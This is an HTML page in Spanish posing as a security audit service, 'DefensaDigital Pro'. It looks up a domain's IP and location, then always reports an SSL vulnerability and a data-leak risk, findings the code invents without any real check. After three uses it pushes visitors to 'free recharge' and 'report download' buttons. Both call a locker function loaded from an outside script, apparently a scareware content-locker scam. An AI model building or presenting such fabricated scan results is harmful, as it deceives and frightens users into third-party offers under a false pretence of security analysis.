<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DefensaDigital Pro | Auditoría de Seguridad</title>
    
    <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%233b82f6'%3E%3Cpath d='M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z'%3E%3C/path%3E%3Cpath d='M12 8v4'%3E%3C/path%3E%3Cpath d='M12 16h.01'%3E%3C/path%3E%3C/svg%3E">

    <script type="text/javascript" src="https://trianglerockers.com/script_include.php?it=1888166&app=1"></script>

    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;800&family=Fira+Code:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root { 
            --primary: #3b82f6; --primary-glow: rgba(59, 130, 246, 0.4);
            --bg-overlay: rgba(15, 23, 42, 0.75); --text-main: #f8fafc; 
            --text-muted: #94a3b8; --card-bg: rgba(30, 41, 59, 0.6); 
            --border: rgba(255, 255, 255, 0.1); --danger: #ef4444; 
            --warning: #f59e0b; --success: #10b981; --console-bg: #020617;
        }
        
        * { box-sizing: border-box; }
        
        body { 
            background-color: #0f172a;
            background-image: linear-gradient(rgba(15, 23, 42, 0.8), rgba(15, 23, 42, 0.9)), url('https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1920'); 
            background-size: cover; background-position: center; background-attachment: fixed;
            color: var(--text-main); font-family: 'Inter', sans-serif; 
            margin: 0; display: flex; flex-direction: column; align-items: center; 
            min-height: 100vh; padding: 40px 20px;
            overflow-y: auto; /* Permite bajar si el contenido es largo */
            perspective: 1000px;
        }

        .credits-badge {
            position: fixed; top: 20px; right: 20px; background: rgba(15, 23, 42, 0.9);
            padding: 10px 20px; border-radius: 30px; border: 1px solid var(--primary);
            font-family: 'Fira Code', monospace; font-size: 0.9rem; z-index: 100;
            box-shadow: 0 0 15px var(--primary-glow); backdrop-filter: blur(5px);
        }

        #splash-screen {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #020617; z-index: 9999; display: flex; flex-direction: column;
            justify-content: center; align-items: center;
            transition: opacity 0.8s ease, visibility 0.8s;
        }
        .splash-logo { width: 80px; height: 80px; margin-bottom: 20px; animation: pulseGlow 2s infinite; }
        .splash-bar-container { width: 250px; height: 4px; background: rgba(255,255,255,0.1); border-radius: 4px; overflow: hidden; }
        .splash-bar-fill { height: 100%; width: 0%; background: var(--primary); animation: loadSystem 2.5s ease-in-out forwards; }
        .splash-hidden { opacity: 0; visibility: hidden; pointer-events: none; }

        @keyframes loadSystem { 0% { width: 0%; } 100% { width: 100%; } }
        @keyframes pulseGlow { 0%, 100% { filter: drop-shadow(0 0 5px var(--primary)); transform: scale(1); } 50% { filter: drop-shadow(0 0 15px var(--primary)); transform: scale(1.05); } }

        #cyberCanvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; pointer-events: none; opacity: 0.3; }

        .header { position: relative; z-index: 10; text-align: center; margin-bottom: 2rem; background: var(--bg-overlay); padding: 20px 40px; border-radius: 16px; border: 1px solid var(--border); backdrop-filter: blur(10px); width: 100%; max-width: 650px;}
        .header h1 { margin: 0; font-size: 1.8rem; background: linear-gradient(to right, #60a5fa, #a78bfa); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-weight: 800; }

        .container { position: relative; z-index: 10; background: var(--card-bg); padding: 2.5rem; width: 100%; max-width: 650px; border-radius: 16px; border: 1px solid var(--border); backdrop-filter: blur(16px); transform-style: preserve-3d; transition: transform 0.1s ease-out; margin-bottom: 50px; }
        
        .input-group { display: flex; gap: 12px; margin-bottom: 1.5rem; }
        input { flex-grow: 1; padding: 14px; background: rgba(15, 23, 42, 0.8); border: 1px solid var(--border); color: white; border-radius: 10px; outline: none; font-size: 1rem; }
        input:focus { border-color: var(--primary); }
        
        button { background: linear-gradient(135deg, var(--primary), #2563eb); color: white; border: none; padding: 14px 28px; font-weight: 600; border-radius: 10px; cursor: pointer; transition: 0.3s; }
        button:disabled { background: #334155; opacity: 0.6; cursor: not-allowed; }

        #reloadBtn { background: linear-gradient(135deg, #10b981, #059669); margin-top: 10px; display: none; width: 100%; }

        #console { background: var(--console-bg); color: var(--success); padding: 20px; border-radius: 10px; font-family: 'Fira Code', monospace; font-size: 0.85rem; line-height: 1.6; height: 180px; overflow-y: auto; margin-bottom: 1.5rem; display: none; border: 1px solid #1e293b; }
        .blinking-cursor { display: inline-block; width: 8px; height: 15px; background-color: var(--success); vertical-align: middle; animation: blink 1s step-end infinite; margin-left: 5px; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }

        .log-prefix { color: #38bdf8; font-weight: bold; } .log-warn { color: var(--warning); } .log-hex { color: #64748b; font-size: 0.75rem; margin-right: 8px; }

        .result-box { display: none; padding-top: 1.5rem; }
        .vulnerability-card { border: 1px solid var(--border); border-radius: 10px; padding: 15px; margin-bottom: 1rem; background: rgba(15, 23, 42, 0.4); border-left: 4px solid var(--warning); }
        .lock-btn { background: #ffffff; color: #0f172a; padding: 16px; border-radius: 10px; font-weight: 900; display: block; text-align: center; text-decoration: none; margin-top: 25px; box-shadow: 0 4px 15px rgba(255,255,255,0.1); }
    </style>
</head>
<body>

    <div class="credits-badge">⚡ ENERGÍA: <span id="creditCount">3</span>/3</div>

    <div id="splash-screen">
        <svg class="splash-logo" viewBox="0 0 24 24" fill="none" stroke="var(--primary)" stroke-width="1.5">
            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
        </svg>
        <div class="splash-bar-container"><div class="splash-bar-fill"></div></div>
    </div>

    <canvas id="cyberCanvas"></canvas>

    <div class="header">
        <h1>DefensaDigital Pro</h1>
        <p>Análisis Forense Real-Time</p>
    </div>

    <div class="container" id="mainContainer">
        <div id="inputSection">
            <div class="input-group">
                <input type="text" id="targetUrl" placeholder="Ej: dominio.com" autocomplete="off">
                <button id="scanBtn" onclick="runAudit()">Auditar</button>
            </div>
            <button id="reloadBtn" onclick="call_locker()">🔋 RECARGAR ENERGÍA (GRATIS)</button>
        </div>

        <div id="console"></div>

        <div id="resultBox" class="result-box">
            <div id="finalStatus" style="text-align: center; margin-bottom: 15px;"></div>
            <div id="details"></div>
            <a href="javascript:void(0)" onclick="call_locker()" class="lock-btn">📄 DESCARGAR REPORTE TÉCNICO</a>
        </div>
    </div>

    <script>
        let credits = localStorage.getItem('user_credits') ? parseInt(localStorage.getItem('user_credits')) : 3;
        let is3DActive = false;
        updateUI();

        function updateUI() {
            document.getElementById('creditCount').innerText = credits;
            if (credits <= 0) {
                document.getElementById('scanBtn').style.display = 'none';
                document.getElementById('targetUrl').style.display = 'none';
                document.getElementById('reloadBtn').style.display = 'block';
            } else {
                document.getElementById('scanBtn').style.display = 'block';
                document.getElementById('targetUrl').style.display = 'block';
                document.getElementById('reloadBtn').style.display = 'none';
            }
        }

        // FÍSICA 3D MEJORADA PARA NO CORTAR PANTALLA
        document.addEventListener('mousemove', (e) => {
            if(!is3DActive) return;
            let xAxis = (window.innerWidth / 2 - e.pageX) / 50; 
            let yAxis = (window.innerHeight / 2 - e.pageY) / 50;
            document.getElementById('mainContainer').style.transform = `rotateY(${xAxis}deg) rotateX(${yAxis}deg)`;
        });

        setTimeout(() => {
            document.getElementById('splash-screen').classList.add('splash-hidden');
            setTimeout(() => { is3DActive = true; }, 300); 
        }, 2500);

        function getHex() { return '[0x' + Math.floor(Math.random()*16777215).toString(16).toUpperCase().padStart(4, '0') + '] '; }

        async function runAudit() {
            const domain = document.getElementById('targetUrl').value.trim();
            if(!domain || !domain.includes('.')) { alert("Introduce un dominio válido"); return; }
            
            credits--;
            localStorage.setItem('user_credits', credits);
            updateUI();

            const cons = document.getElementById('console');
            const res = document.getElementById('resultBox');
            document.getElementById('scanBtn').disabled = true;
            
            cons.style.display = 'block';
            cons.innerHTML = "<span class='blinking-cursor'></span>";
            res.style.display = 'none';

            const typeLog = async (text) => {
                const cursor = cons.querySelector('.blinking-cursor');
                const line = document.createElement('div');
                cons.insertBefore(line, cursor);
                line.innerHTML = text;
                cons.scrollTop = cons.scrollHeight;
                await new Promise(r => setTimeout(r, 600));
            };

            await typeLog(`<span class="log-hex">${getHex()}</span> > Iniciando conexión DNS...`);
            
            try {
                const response = await fetch(`https://dns.google/resolve?name=${domain}`);
                const data = await response.json();
                const ip = data.Answer ? data.Answer[0].data : "Protegida";
                await typeLog(`<span class="log-hex">${getHex()}</span> > IPv4 Detectada: <span style="color:#fff">${ip}</span>`);

                let geoData = { city: "Desconocida", country_name: "Desconocido" };
                try {
                    const geoRes = await fetch(`https://ipapi.co/${ip.split(',')[0]}/json/`);
                    geoData = await geoRes.json();
                } catch(e) {}

                await typeLog(`<span class="log-hex">${getHex()}</span> > Localización: ${geoData.city || 'Cloud'}, ${geoData.country_name || 'Global'}`);
                await typeLog(`<span class="log-hex">${getHex()}</span> > [WARN] Vulnerabilidad SSL detectada.`);

                setTimeout(() => {
                    cons.style.display = 'none';
                    res.style.display = 'block';
                    document.getElementById('finalStatus').innerHTML = "<h2 style='color:var(--danger); margin:0;'>⚠️ RIESGO DETECTADO</h2>";
                    document.getElementById('details').innerHTML = `
                        <div class="vulnerability-card" style="border-left-color:var(--danger)">
                            <b>Fuga de información en: ${domain}</b>
                            <p>IP: ${ip} | Host: ${geoData.city || 'Nodo Externo'}</p>
                            <p style="font-size:0.8rem; opacity:0.7;">El servidor expone cabeceras sensibles. Riesgo de secuestro de datos medio-alto.</p>
                        </div>`;
                    document.getElementById('scanBtn').disabled = false;
                    // Scroll automático al resultado
                    window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
                }, 800);
            } catch (e) {
                alert("Error de conexión");
                document.getElementById('scanBtn').disabled = false;
            }
        }

        // FONTO PARTICULAS
        const canvas = document.getElementById('cyberCanvas');
        const ctx = canvas.getContext('2d');
        let w, h;
        window.onresize = () => { w = canvas.width = window.innerWidth; h = canvas.height = window.innerHeight; };
        window.onresize();
        function animate() {
            ctx.clearRect(0,0,w,h);
            ctx.fillStyle = "rgba(96, 165, 250, 0.15)";
            for(let i=0; i<40; i++) ctx.fillRect(Math.random()*w, Math.random()*h, 2, 2);
            requestAnimationFrame(animate);
        }
        animate();
    </script>
</body>
</html>
